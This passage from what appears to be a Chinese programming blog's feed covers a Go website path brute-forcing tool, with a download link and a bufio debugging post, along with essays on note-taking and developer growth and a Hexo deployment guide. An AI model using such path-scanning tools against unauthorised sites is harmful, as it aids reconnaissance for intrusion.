class="string">"\n"</span>)</div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"Dic you can select : "</span>)</div><div class="line">	<span class="keyword">for</span> _, file := <span class="keyword">range</span> dirList &#123;</div><div class="line">		fmt.Printf(<span class="string">"    %s\n"</span>, file.Name())</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>只编译了win平台下的，如果有需要可以自行编译</p>
<p><strong><a href="http://pan.baidu.com/s/1c2BYT8k" target="_blank" rel="external">源码及字典及win程序</a></strong><br><strong>密码: g1gd</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍&lt;/p&gt;
&lt;p&gt;先放张图&lt;img src=&quot;https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif&quot; alt=&quot;演示1.gif&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://akkuman.coding.me/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://akkuman.coding.me/tags/Golang/"/>
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Golang踩坑录 两种方式来读取文件一行所导致的问题</title>
    <link href="http://akkuman.coding.me/2017/02/04/Golang%E8%B8%A9%E5%9D%91%E5%BD%95-%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%80%E8%A1%8C%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98.html"/>
    <id>http://akkuman.coding.me/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题.html</id>
    <published>2017-02-04T14:55:15.000Z</published>
    <updated>2017-03-03T14:13:58.822Z</updated>
    
    <content type="html"><![CDATA[<p>前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题<br>我要做的东西是网站路径爆破<br>所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题</p>
<a id="more"></a>
<p>下面是一个小片段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">400 Bad Request-----http://www.xxx.com/channel.asp</div><div class="line">400 Bad Request-----http://www.xxx.com/index.asp</div><div class="line">404 Not Found-----http://www.xxx.com/admin.asp</div></pre></td></tr></table></figure></p>
<p>程序本身并没有错误，但是运行结果就比较怪了<br>Bad Request?<br>这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request<br>经过几轮测试，我觉得应该是网址拼接上出了问题</p>
<p>我的拼接函数是这样<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewReader(fURL)</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		urlpath, readerError := allURLTxt.ReadString(<span class="string">'\n'</span>)</div><div class="line">		newurl := baseurl + strings.Replace(urlpath, <span class="string">"\n"</span>, <span class="string">""</span>, <span class="number">-1</span>)</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">		<span class="keyword">if</span> readerError == io.EOF &#123;</div><div class="line">			fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">			<span class="keyword">return</span> urlList</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我把取一行的方式换成bufio.NewScanner就正常了<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewScanner(fURL)</div><div class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</div><div class="line">		newurl := baseurl + allURLTxt.Text()</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">	<span class="keyword">return</span> urlList</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生<br>我特地去查了查api文档<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewReader</span><span class="params">(rd io.Reader)</span> *<span class="title">Reader</span></span></div><div class="line">//<span class="title">NewReader</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Reader</span> <span class="title">whose</span> <span class="title">buffer</span> <span class="title">has</span> <span class="title">the</span> <span class="title">default</span> <span class="title">size</span>. </div><div class="line"><span class="title">func</span> <span class="params">(b *Reader)</span> <span class="title">ReadString</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></div><div class="line">//<span class="title">ReadString</span> <span class="title">reads</span> <span class="title">until</span> <span class="title">the</span> <span class="title">first</span> <span class="title">occurrence</span> <span class="title">of</span> <span class="title">delim</span> <span class="title">in</span> <span class="title">the</span> <span class="title">input</span>, <span class="title">returning</span> <span class="title">a</span> <span class="title">string</span> <span class="title">containing</span> <span class="title">the</span> <span class="title">data</span> <span class="title">up</span> <span class="title">to</span> <span class="title">and</span> <span class="title">including</span> <span class="title">the</span> <span class="title">delimiter</span>. <span class="title">If</span> <span class="title">ReadString</span> <span class="title">encounters</span> <span class="title">an</span> <span class="title">error</span> <span class="title">before</span> <span class="title">finding</span> <span class="title">a</span> <span class="title">delimiter</span>, <span class="title">it</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">data</span> <span class="title">read</span> <span class="title">before</span> <span class="title">the</span> <span class="title">error</span> <span class="title">and</span> <span class="title">the</span> <span class="title">error</span> <span class="title">itself</span> <span class="params">(often io.EOF)</span>. <span class="title">ReadString</span> <span class="title">returns</span> <span class="title">err</span> != <span class="title">nil</span> <span class="title">if</span> <span class="title">and</span> <span class="title">only</span> <span class="title">if</span> <span class="title">the</span> <span class="title">returned</span> <span class="title">data</span> <span class="title">does</span> <span class="title">not</span> <span class="title">end</span> <span class="title">in</span> <span class="title">delim</span>. <span class="title">For</span> <span class="title">simple</span> <span class="title">uses</span>, <span class="title">a</span> <span class="title">Scanner</span> <span class="title">may</span> <span class="title">be</span> <span class="title">more</span> <span class="title">convenient</span>. </div><div class="line"><span class="title">func</span> <span class="title">NewScanner</span><span class="params">(r io.Reader)</span> *<span class="title">Scanner</span></div><div class="line">//<span class="title">NewScanner</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">read</span> <span class="title">from</span> <span class="title">r</span>. <span class="title">The</span> <span class="title">split</span> <span class="title">function</span> <span class="title">defaults</span> <span class="title">to</span> <span class="title">ScanLines</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Scan</span><span class="params">()</span> <span class="title">bool</span></div><div class="line">//<span class="title">Scan</span> <span class="title">advances</span> <span class="title">the</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">the</span> <span class="title">next</span> <span class="title">token</span>, <span class="title">which</span> <span class="title">will</span> <span class="title">then</span> <span class="title">be</span> <span class="title">available</span> <span class="title">through</span> <span class="title">the</span> <span class="title">Bytes</span> <span class="title">or</span> <span class="title">Text</span> <span class="title">method</span>. <span class="title">It</span> <span class="title">returns</span> <span class="title">false</span> <span class="title">when</span> <span class="title">the</span> <span class="title">scan</span> <span class="title">stops</span>, <span class="title">either</span> <span class="title">by</span> <span class="title">reaching</span> <span class="title">the</span> <span class="title">end</span> <span class="title">of</span> <span class="title">the</span> <span class="title">input</span> <span class="title">or</span> <span class="title">an</span> <span class="title">error</span>. <span class="title">After</span> <span class="title">Scan</span> <span class="title">returns</span> <span class="title">false</span>, <span class="title">the</span> <span class="title">Err</span> <span class="title">method</span> <span class="title">will</span> <span class="title">return</span> <span class="title">any</span> <span class="title">error</span> <span class="title">that</span> <span class="title">occurred</span> <span class="title">during</span> <span class="title">scanning</span>, <span class="title">except</span> <span class="title">that</span> <span class="title">if</span> <span class="title">it</span> <span class="title">was</span> <span class="title">io</span>.<span class="title">EOF</span>, <span class="title">Err</span> <span class="title">will</span> <span class="title">return</span> <span class="title">nil</span>. <span class="title">Scan</span> <span class="title">panics</span> <span class="title">if</span> <span class="title">the</span> <span class="title">split</span> <span class="title">function</span> <span class="title">returns</span> 100 <span class="title">empty</span> <span class="title">tokens</span> <span class="title">without</span> <span class="title">advancing</span> <span class="title">the</span> <span class="title">input</span>. <span class="title">This</span> <span class="title">is</span> <span class="title">a</span> <span class="title">common</span> <span class="title">error</span> <span class="title">mode</span> <span class="title">for</span> <span class="title">scanners</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Text</span><span class="params">()</span> <span class="title">string</span></div><div class="line">//<span class="title">Text</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">most</span> <span class="title">recent</span> <span class="title">token</span> <span class="title">generated</span> <span class="title">by</span> <span class="title">a</span> <span class="title">call</span> <span class="title">to</span> <span class="title">Scan</span> <span class="title">as</span> <span class="title">a</span> <span class="title">newly</span> <span class="title">allocated</span> <span class="title">string</span> <span class="title">holding</span> <span class="title">its</span> <span class="title">bytes</span>.</div></pre></td></tr></table></figure></p>
<p>按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符<br>虽说我第一种方法也用strings.Replace方法把”\n”替换成了””空字符，但是可能还是有点奇奇怪怪的东西</p>
<p><em>转载请注明出处</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题&lt;br&gt;我要做的东西是网站路径爆破&lt;br&gt;所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题&lt;/p&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://akkuman.coding.me/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://akkuman.coding.me/tags/Golang/"/>
    
      <category term="问题解决" scheme="http://akkuman.coding.me/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>笔记带给我们是真实的知识增长么？你需要好好考虑了</title>
    <link href="http://akkuman.coding.me/2017/01/21/%E7%AC%94%E8%AE%B0%E5%B8%A6%E7%BB%99%E6%88%91%E4%BB%AC%E6%98%AF%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E5%A2%9E%E9%95%BF%E4%B9%88%EF%BC%9F%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A5%BD%E5%A5%BD%E8%80%83%E8%99%91%E4%BA%86.html"/>
    <id>http://akkuman.coding.me/2017/01/21/笔记带给我们是真实的知识增长么？你需要好好考虑了.html</id>
    <published>2017-01-21T08:54:38.000Z</published>
    <updated>2017-03-03T15:40:10.079Z</updated>
    
    <content type="html"><![CDATA[<p>我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。<br><a id="more"></a><br>其实滥用或者过分依赖这些笔记软件，最大的坏处是产生了知识增长的错觉。剪藏一篇机器学习的长文，就以为自己的知识增长了，其实只扫了一眼前言。 下载了一系列新框架的开发教程，三分钟热度把开发环境搭建完，跟着第一章跑了个hello world就弃坑了，但还是在欺骗自己，觉得自己已经掌握了，最不济那些教程已经被我收到硬盘里了，要用的时候再翻出来学嘛。而且，这种廉价的获得知识的错觉，带来的成就感比真的花时间去学习还要强，甚至会形成“要开工了-&gt;先了解下业界动态，去各大论坛微博逛一圈-&gt;哇，又有这么多新教程/技巧/开源库，看不过来，先保存到笔记软件 -&gt; 啊，不知不觉居然花了一个小时，不过我又不是打游戏看电影，是在收集知识，对自己还是有帮助的，不算虚度时光吧 -&gt; 继续开工，嗯？这个问题好像看到过更好的解决办法，要不要试着优化下？算了算了，反正办法在笔记里存着，以后有时间再重构吧 -&gt;…”</p>
<p>那几个月里我一直就陷在这样的循环里，同时还沾沾自喜于自己的“努力”而不自觉。直到某天，有个面试者坐到我面前时，我惊讶于他面谈时对各类业界动态新框架新技术口若悬河，但是实际的笔试题目却做得惨不忍睹，有些基础概念题都直接留白。我试探性地问了下原因，结果他特别诚恳地看着我说，这些问题的答案都存在他包里的笔记本电脑里，只要他想，分分钟就能搜出来。</p>
<p>当时我下意识地反问了一句：“那谁不会啊？”</p>
<p>说完我自己都惊了一下。</p>
<p>那天之后，我很少再去碰那些笔记软件了。第二大脑什么的都是骗人的，在我得老年痴呆之前，应该不会特别依赖它们。曾经我一个月要从各大技术论坛微博twitter上收集几十篇教程，上百篇技术长文，真正看完的，不到五篇。之后我发现，把产生这些知识的源头掐掉，统统加到127.0.0.1里去，节省下的时间认认真真读几本经典纸质书，跟着官方文档走一遍教程，不收集，多动手多思考，技术长进比之前快得多。实际做项目的时候碰到解决不了的问题怎么办？直接开google去搜呗。根本没必要去浪费时间维护一个私人的知识库。</p>
<p>在人类数千年漫长的文明史中，收藏本来是一件相当奢侈，大量耗费金钱、时间、精力的事情。但到了互联网的时代，这一切被简化成了点点鼠标就能完成的美事。或许因为盗版盛行的原因，它几乎已经是免费的，但它对于个体时间精力的耗费，却始终没有变化。而且，躺在硬盘里的资源们，就像王阳明的花一样，你未看它时，它与你同归于寂，一点关系都没有。</p>
<p>《银河英雄传说》里杨威利说过一句名言：“如果你不记得了，那说明它不重要。” 或许可以再补充一句，“如果你看不完，那就没必要看完。” 大概就是这样，不知不觉写了这么多，与所有现在或曾经的互联网资源收集成瘾症患者共勉。</p>
<p><strong>转自<a href="https://www.v2ex.com/amp/t/191507" target="_blank" rel="external">V2EX</a>一位v友的回答</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。&lt;br&gt;
    
    </summary>
    
      <category term="生活" scheme="http://akkuman.coding.me/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>PKM（个人知识管理）类软件收集(偶尔更新列表)</title>
    <link href="http://akkuman.coding.me/2017/01/21/PKM%EF%BC%88%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%EF%BC%89%E7%B1%BB%E8%BD%AF%E4%BB%B6-%E5%81%B6%E5%B0%94%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.html"/>
    <id>http://akkuman.coding.me/2017/01/21/PKM（个人知识管理）类软件-偶尔更新列表.html</id>
    <published>2017-01-21T06:22:41.000Z</published>
    <updated>2017-03-03T15:40:28.127Z</updated>
    
    <content type="html"><![CDATA[<p>evernote(印象笔记)</p>
<p>Wiz<br><a id="more"></a><br>有道云</p>
<p>麦库</p>
<p>leanote</p>
<p>GoogleKeep</p>
<p>OneNote</p>
<p>SimpleNote(wp家的，免费)</p>
<p>pocket(稍后读的软件，同类的还有Instapaper，国内的收趣)</p>
<p>MyBase</p>
<p>RaysNote(v友开发)</p>
<p>CintaNotes</p>
<p><a href="https://jitaku.io" target="_blank" rel="external">https://jitaku.io</a></p>
<p><strong>开源</strong></p>
<p>Gitit-Bigger</p>
<p>Laverna</p>
<p>paperwork</p>
<p>DokuWiki</p>
<p>leanote</p>
<p>PermaNote</p>
<p>CherryTree</p>
<p>BrainStorm</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;evernote(印象笔记)&lt;/p&gt;
&lt;p&gt;Wiz&lt;br&gt;
    
    </summary>
    
      <category term="推荐向" scheme="http://akkuman.coding.me/categories/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
    
      <category term="推荐向" scheme="http://akkuman.coding.me/tags/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
      <category term="软件" scheme="http://akkuman.coding.me/tags/%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>web高级开发的成长之路</title>
    <link href="http://akkuman.coding.me/2017/01/20/web%E9%AB%98%E7%BA%A7%E5%BC%80%E5%8F%91%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF.html"/>
    <id>http://akkuman.coding.me/2017/01/20/web高级开发的成长之路.html</id>
    <published>2017-01-20T14:53:41.000Z</published>
    <updated>2017-03-03T15:39:54.598Z</updated>
    
    <content type="html"><![CDATA[<p>读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。</p>
<p><strong>正文如下：</strong><br><a id="more"></a><br>本人也是coding很多年，虽然很失败，但也总算有点失败的心得，不过我在中国，大多数程序员都是像我一样，在一直走着弯路。如果想成为一个架构师，就必须走正确的路，否则离目标越来越远，正在辛苦工作的程序员们，你们有没有下面几种感觉？</p>
<p>　　一、我的工作就是按时完成领导交给我的任务，至于代码写的怎样，知道有改进空间，但没时间去改进，关键是领导也不给时间啊。</p>
<p>　　二、我发现我的水平总是跟不上技术的进步，有太多想学的东西要学，jQuery用的人最近比较多啊，听说最近MVC比较火，还有LINQ，听说微软又有Silverlight了……</p>
<p>　　三、我发现虽然我工作几年了，除了不停的coding，Ctrl+C和Ctrl+V更熟练了，但编码水平并没有提高，还是一个普通程序员，但有人已经做到架构师了。</p>
<p>　　四、工作好几年了，想跳槽换个工作，结果面试的考官都问了一些什么数据结构，什么垃圾回收，什么设计模式之类的东西，虽然看过，但是平时用不着，看了也忘记了，回答不上来，结果考官说我基础太差。。。</p>
<p>　　有没有，如果没有，接下来就不用看了，你一定是大拿了，或者已经明白其中之道了，呵呵。</p>
<p>　　如果有，恭喜你，你进入学习误区了，如果想在技术上前进的话，就不能一直的coding，为了完成需求而工作，必须在coding的同时，让我们的思维，水平也在不停的提高。</p>
<p>　　写代码要经历下面几个阶段。</p>
<p>　　一 、你必须学习面向对象的基础知识，如果连这个都忘了，那你的编程之路注定是在做原始初级的重复！</p>
<p>　　很多程序员都知道类、方法、抽象类、接口等概念，但是为什么要面向对象，好处在哪里，要解决什么问题？只是明白概念，就是表达不清楚，然后在实 际工作中也用不上，过了一段时间，面向对象的东西又模糊了，结果是大多数程序员用着面向对象的语言做着面向过程的工作，因此要学习面向对象，首先应该明白 面向对象的目的是什么？</p>
<p>　　面向对象的目的是什么？</p>
<p>　　开发语言在不断发展，从机器语言，到汇编，到高级语言，再到第四代语言;软件开发方法在不断发展，从面向过程，面向对象，到面向方面等。虽然这些都在不断发展，但其所追求的目标却一直没变，这些目标就是：</p>
<p>　　1. 降低软件开发的复杂度</p>
<p>　　2. 提高软件开发的效率</p>
<p>　　3. 提高软件质量：可维护性，可扩展性，可重用性等。</p>
<p>　　其中语言的发展，开发方法的发展在1,2两条上面取得了极大的进步，但对于第3条，我们不能光指望开发方法本身来解决。</p>
<p>　　提高软件质量：可维护性，可扩展性，可重用性等，再具体点，就是高内聚、低耦合，面向对象就是为了解决第3条的问题。因此要成为一个好的程序员，最绕不开的就是面向对象了。</p>
<p>　　二、 要想学好面向对象，就必须学习设计模式。</p>
<p>　　假定我们了解了面向对象的目的，概念了，但是我们coding过程中却发现，我们的面向对象的知识似乎一直派不上用场，其实道理很简单，是因为 我们不知道怎么去用，就像游泳一样，我们已经明白了游泳的好处，以及游泳的几种姿势，狗刨、仰泳、蛙泳、自由泳，但是我们依然不会游泳。。。。</p>
<p>　　因此有了这些基本原则是不行的，我们必须有一些更细的原则去指导我们的设计，这就有了更基础的面向对象的五大原则，而把这几种原则更详细的应用 到实际中来，解决实际的问题，这就是设计模式。因此要学好OO，必须要学习设计模式，学习设计模式，按大师的话说，就是在人类努力解决的许多领域的成功方 案都来源于各种模式，教育的一个重要目标就是把知识的模式一代一代传下去。</p>
<p>　　因此学习设计模式，就像我们在看世界顶级的游泳比赛，我们为之疯狂，为之着迷。</p>
<p>　　三、学习设计模式</p>
<p>　　正像我们并不想只是看别人表演，我们要自己学会游泳，这才是我们的目的所在。</p>
<p>　　当我们看完几篇设计模式后，我们为之精神振奋，在新的coding的时候，我们总是想努力的用上学到的设计模式，但是经常在误用模式，折腾半天发现是在脱裤子抓痒。。。</p>
<p>　　当学完设计模式之后，我们又很困惑，感觉这些模式简直太像了，很多时候我们分不清这些模式之间到底有什么区别，而且明白了设计过程中的一个致命 的东西——过度设计，因为设计模式要求我们高扩展性，高重用性，但是在需求提出之初，我们都不是神，除了依靠过去的经验来判断外，我们不知道哪些地方要扩 展，哪些地方要重用，而且过去的经验就一定是正确的吗？所以我们甚至不敢再轻易用设计模式，而是还一直在用面向过程的方法在实现需求。</p>
<p>　　四、学习重构</p>
<p>　　精彩的代码是怎么想出来的，比看到精彩的代码更加令人期待。于是我们开始思考，这些大师们莫非不用工作，需求来了没有领导规定完成时间，只以设 计精彩的代码为标准来开展工作？这样的工作太爽了，也不可能，老板不愿意啊。就算这些理想的条件他都有，他就一开始就设计出完美的代码来了？也不可能啊， 除非他是神，一开始就预料到未来的所有需求，那既然这些条件都没有，他们如何写出的精彩代码？</p>
<p>　　Joshua Kerievsky在那篇著名的《模式与XP》〔收录于《极限编程研究》一书）中明白地指出：在设计前期使用模式常常导致过度工程（over- engineering)。这是一个残酷的现实，单凭对完美的追求无法写出实用的代码，而「实用」是软件压倒一切的要素。</p>
<p>　　在《重构——改善既有的代码的设计》一书中提到，通过重构（refactoring），你可以找出改变的平衡点。你会发现所谓设计不再是一切动 作的前提，而是在整个开发过程中逐渐浮现出来。在系统构筑过程中，你可以学习如何强化设计；其间带来的互动可以让一个程序在开发过程中持续保有良好的设 计。</p>
<p>　　总结起来就是说，我们在设计前期就使用设计模式，往往导致设计过度，因此应该在整个开发过程，整个需求变更过程中不断的重构现在的代码，才能让 程序一直保持良好的设计。由此可见，开发过程中需要一直重构，否则无论当初设计多么的好，随着需求的改变，都会变成一堆烂代码，难以维护，难以扩展。所谓 重构是这样一个过程：「在不改变代码外在行为的前提下，对代码做出修改，以改进程序的内部结构」。重构的目标，就是设计模式，更本质的讲就是使程序的架构 更趋合理，从而提高软件的可维护性，可扩展性，可重用性。</p>
<p>　　《重构——改善既有的代码的设计》一书也是Martin Fowler等大师的作品，软件工程领域的超级经典巨著，与另一巨著《设计模式》并称”软工双雄”，不可不读啊。</p>
<p>　　五、开始通往优秀软件设计师的路上</p>
<p>　　通过设计模式和重构，我们的所学和我们工作的coding终于结合上了，我们可以在工作中用面向对象的思维去考虑问题，并开始学习重构了。这就 像游泳一样，我们看完了各种顶级的游泳比赛，明白各种规则，名人使用的方法和技巧，现在是时候回家去村旁边的小河里练练了。练习也是需要有教练的，推荐另 一本经典书叫《重构与模式》，引用他开篇的介绍，本书开创性地深入揭示了重构与模式这两种软件开发关键技术之间的联系，说明了通过重构实现模式改善既有的 设计，往往优于在新的设计早期使用模式。本书不仅展示了一种应用模式和重构的创新方法，而且有助于读者结合实战深入理解重构和模式。</p>
<p>　　这本书正是我们需要的教练，值得一读。</p>
<p>　　六、没有终点，只有坚持不懈的专研和努力。</p>
<p>　　经过了几年的坚持，终于学会了灵活的运用各种模式，我们不需要去刻意的想用什么模式，怎么重构。程序的目标，就是可维护性，可扩展性，可重用 性，都已经成了一种编程习惯，一种思维习惯，就像我们练习了几年游泳之后，我们不用再刻意的去考虑，如何让自己能在水上漂起来，仰泳和蛙泳的区 别….. 而是跳进水里，就自然的游了起来，朝对岸游去。但是要和大师比起来，嘿嘿，我们还有很长的路要走，最终也可能成不了大师，但无论能不能成为大师，我们已经 走在了成为大师的正确的路上，我们和别的程序员已经开始不一样，因为他们无论再过多少年，他们的水平不会变，只是在重复造轮子，唯一比你快的，就是 Ctrl+C和Ctrl+V。</p>
<p>　　正确的路上，只要坚持，就离目标越来越近，未来就一定会是一个优秀的架构师，和优秀架构师的区别，可能只是时间问题。</p>
<p><strong>转自<a href="http://www.cnblogs.com/leefan/p/5489984.html" target="_blank" rel="external">李凡的博客</a></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;正文如下：&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web" scheme="http://akkuman.coding.me/categories/Web/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>hexo在github和coding.net部署并分流（一）</title>
    <link href="http://akkuman.coding.me/2017/01/10/hexo%E5%9C%A8github%E5%92%8Ccoding-net%E9%83%A8%E7%BD%B2%E5%B9%B6%E5%88%86%E6%B5%81%EF%BC%88%E4%B8%80%EF%BC%89-1.html"/>
    <id>http://akkuman.coding.me/2017/01/10/hexo在github和coding-net部署并分流（一）-1.html</id>
    <published>2017-01-10T13:22:00.000Z</published>
    <updated>2017-01-10T13:23:11.558Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装GIT和Node-JS"><a href="#安装GIT和Node-JS" class="headerlink" title="安装GIT和Node.JS"></a>安装GIT和Node.JS</h1><p>首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git config --global user.name <span class="string">"Your Name"</span></div><div class="line">git config --global user.email <span class="string">"email@example.com"</span></div></pre></td></tr></table></figure></p>
<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。<br><strong>注意：</strong>git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
<a id="more"></a>
<p>#安装并初始化HEXO<br>如果你是在Windows上，请打开Git-CMD<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/git-cmd-exa.png" alt="1"><br>假如你是想在D:\blog\下建立你的博客，请先在D盘下新建文件夹blog<br>在Git-CMD中输入<code>npm install -g hexo-cli</code>回车开始安装hexo<br>安装完成后将git cmd工作目录切换至D:\blog\然后输入<code>hexo init</code>回车，或者直接在git cmd中输入<code>hexo init d:\\blog</code><br>如果你的d:\blog\下的目录形式是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── _config.yml // 网站的配置信息，你可以在此配置大部分的参数。</div><div class="line">├── package.json </div><div class="line">├── scaffolds // 模板文件夹。当你新建文章时，Hexo会根据scaffold来建立文件。</div><div class="line">├── source // 存放用户资源的地方</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">└── themes // 存放网站的主题。Hexo会根据主题来生成静态页面。</div></pre></td></tr></table></figure></p>
<p>那么你的hexo安装并初始化完成<br>然后输入<code>hexo server</code>启动本地demo，打开浏览器，查看<a href="http://localhost:4000/可以看到自己的博客" target="_blank" rel="external">http://localhost:4000/可以看到自己的博客</a></p>
<h1 id="将之托管到github和coding上"><a href="#将之托管到github和coding上" class="headerlink" title="将之托管到github和coding上"></a>将之托管到github和coding上</h1><h2 id="github项目创建"><a href="#github项目创建" class="headerlink" title="github项目创建"></a>github项目创建</h2><p>1.注册github账号<br>2.创建项目仓库<br>进入<a href="https://github.com/" target="_blank" rel="external">github.com</a>，然后点击右上角 + –&gt;new repository</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/new%20rep.png" alt="2"></p>
<p>3.在Repository name中填写Github账号名.github.io，点击Create repository，完成创建。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-github-1.png" alt="3"></p>
<h2 id="Coding项目创建"><a href="#Coding项目创建" class="headerlink" title="Coding项目创建"></a>Coding项目创建</h2><p>1.注册Coding账号<br>2.创建项目仓库</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-1.png" alt="4"></p>
